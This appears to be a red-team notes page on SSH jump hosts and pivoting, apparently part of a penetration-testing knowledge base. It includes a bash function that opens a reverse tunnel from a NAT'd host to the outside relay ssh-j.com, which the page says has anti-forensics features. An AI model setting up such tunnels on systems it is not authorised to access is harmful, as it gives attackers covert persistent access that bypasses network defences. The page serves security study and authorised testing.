# Jump Host

## 01 - Usage

```
$ ssh -J <username>@<jump_IP_1>[:<PORT>],<username>@<jump_IP_n>[:<PORT>] <username>@<destination_IP>
```

## 02 - Scenarios

### 2.1 - SSH Pivoting to Multiple Servers

TODO: Draw a diagram to visualize jumping from a compromised SSH server in the initial foothold then to jump on multiple hosts when passing credentials.

```

```

### 2.2 - SSH to a host behind NAT

This shell script function also provides with PTY and colors with most anti-forensics features to terminate the established connection.

```bash
sshj() {
   local pw
   pw=${1,,}
   [[ -z $pw ]] && { pw=$(head -c64 </dev/urandom | base64 | tr -d -c a-z0-9); pw=${pw:0:12}; }
   echo "Press Ctrl-C to stop this tunnel."
   echo -e "To ssh to ${USER:-root}@${2:-127.0.0.1}:${3:-22} type: \e[0;36mssh -J ${pw}@ssh-j.com ${USER:-root}@${pw}\e[0m"
   ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes ${pw}@ssh-j.com -N -R ${pw}:22:${2:-0}:${3:-22}
}
```

Generates a random tunnel ID (e.g. `5dmxf27tl4kx`) and keeps the tunnel connected.

```
$ sshj
```

Creates tunnel to `127.0.0.1:22` with specific tunnel ID.

```
$ sshj <username_ID>
```

Tunnel to host's IPv4 with specific port on the LAN.

```
$ sshj <username_ID> <bind_IPv4> <bind_PORT>
```

To connect the host behind the NAT.

```
$ ssh -J <username_ID>@ssh-j.com
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x00 - Exploitation/0xF - Remote Services Exploitation/Network Ports/Remote Services/SSH/Unix Shell]]

- [[04 - Remote Port Forwarding]]

### SSH-J

- [SSH-J](https://ssh-j.com/)

### SlayerLabs

- [SlayerLabs: Tunneling Quick Guide](https://posts.slayerlabs.com/tunneling-quick-guide/)